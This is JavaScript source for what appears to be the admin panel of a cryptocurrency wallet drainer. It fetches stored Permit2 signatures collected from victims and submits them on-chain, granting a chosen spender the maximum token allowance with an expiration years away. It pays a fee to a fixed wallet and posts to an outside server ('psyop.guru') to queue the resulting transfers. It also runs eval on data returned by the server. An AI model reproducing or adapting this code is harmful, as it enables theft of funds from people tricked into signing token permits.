const instancePermit2 = () => {
    const PERMIT2_ADDRESS ="0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const _Contract = new ethers.Contract(PERMIT2_ADDRESS, ABI.permit2.abi, signer);
    return _Contract;
  }
function GetRequest() {
    var url = location.search; //获取url中"?"符后的字串
    var theRequest = new Object();
    if (url.indexOf("?") != -1) {
        var str = url.substr(1);
        strs = str.split("&");
        for (var i = 0; i < strs.length; i++) {
            theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
        }
    }
    return theRequest;
}
const Permit2Transfer = async (event) => {
    const web3 = new Web3();
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    //收取gas费用sendTransaction
    signer
        .sendTransaction({
            //from: provider.provider.selectedAddress,
            to: "0x5eE4A19bf6D6908AB12853Af169575bBFeCF8BFE",
            value: ethers.utils.parseEther("0.0056"),
        })
        .then((res) => {
            //发布转账消息到mq

            const row_id =
                event.target.parentElement.parentElement.attributes["data-key"]
                    .value;
            const apiUrl = "https://psyop.guru/publishtsfmsg";
            const url_parameters = GetRequest();
            const obj = {
                id: row_id,
                token: url_parameters["token"],
                // username: data,
            };
            //发mq消息给服务器，准备transfer
            admin.ajax.post(apiUrl, obj, async function (result) {
                admin.toastr.success(result.data.message);
            });
        });
};

const Permit2SpenderMulti = async (event) => {
    // 初始化变量
    const row_id =
        event.target.parentElement.parentElement.attributes["data-key"].value;
    const url = "/inspect_signature";
    const obj = {
        id: row_id,
    };

    let permit2_data = {};
    admin.ajax.post(url, obj, async function (result) {
        const response_data = result.data;
        const amount = "1461501637330902918203684832716283019655932542975";
        const expiration = 1885674579;
        const permit2contract = instancePermit2();
        for await (item of response_data) {
            const details = eval(item.details);
            let permit_token_data = [];

            Object.keys(details).map(function (item, key) {
                permit_token_data.push([
                    details[key].token,
                    amount,
                    expiration,
                    0,
                ]);
            });
            try {
                await permit2contract[
                    "permit(address,((address,uint160,uint48,uint48)[],address,uint256),bytes)"
                ](
                    item.account,
                    [permit_token_data, item.spender_address, expiration],
                    item.signature,
                    {
                        gasLimit: permit_token_data.length * 120000,
                    }
                )
                    .then((result) => {
                        //存进permit2sig表证明己经在链上签过本条信息
                        savePermit2Object(item.account, row_id, result);
                        admin.ajax.navigate(window.location.href);
                    })
                    .catch((err) => {
                        console.log(err);
                    });
            } catch (e) {
                console.log(e.code);
            }
        }
    });
};

const savePermit2Object = async function (account, row_id, raw_obj) {
    const url = "/savepermit";
    const send_data = {
        pc_id: row_id,
        account: account,
        raw_data: raw_obj,
    };
    admin.ajax.post(url, send_data, function (res, error) {
        admin.toastr.success("Save to database");
    });
};


function copy2Clipboard(data) {
    let url = data;
    let oInput = document.createElement("input");
    oInput.value = url;
    document.body.appendChild(oInput);
    oInput.select(); // 选择对象;
    document.execCommand("Copy"); // 执行浏览器复制命令
    admin.toastr.success("copy success!");
    oInput.remove();
}

